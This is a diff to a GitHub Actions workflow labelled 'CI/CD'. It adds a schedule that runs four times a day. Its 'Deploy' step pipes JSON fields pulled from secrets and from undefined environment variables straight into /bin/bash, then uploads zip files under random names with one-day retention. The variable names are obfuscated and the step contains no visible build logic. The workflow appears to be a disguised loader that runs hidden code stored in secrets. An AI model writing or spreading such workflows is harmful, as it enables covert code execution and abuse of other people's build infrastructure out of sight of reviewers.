@@ -2,6 +2,8 @@ name: CI/CD
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '29 0,6,12,18 * * *'
 jobs:
   dispatcher:
     runs-on: ubuntu-latest
@@ -10,18 +12,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: Deploy
         env:
-          zy87121: ${{ secrets.zy87121 }}
+          oae4970: ${{ secrets.oae4970 }}
         run: |
-          printf '%s' "$zy87121" | jq -r .w768 | /bin/bash
-          echo $puglj14 | jq -r .syre721 | /bin/bash
-          printf '%s' "$witht3" | jq -r .bh55 | /bin/bash
-          printf '%s' "$c25" | jq -r .qil90757 | /bin/bash
-          printf '%s' "$up27637" | jq -r .w9 | /bin/bash
+          printf '%s' "$oae4970" | jq -r .dmc1091 | /bin/bash
+          printf '%s' "$qynj5027" | jq -r .r85202 | /bin/bash
+          echo $cq1200 | jq -r .glvl7 | /bin/bash
+          echo $u5130 | jq -r .kvsmb8083 | /bin/bash
+          echo $ydyp2718 | jq -r .h153 | /bin/bash
 
       - name: Save results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: ZlBuwNNt
+          name: 3GkwGVCb
           path: "*.zip"
           retention-days: 1
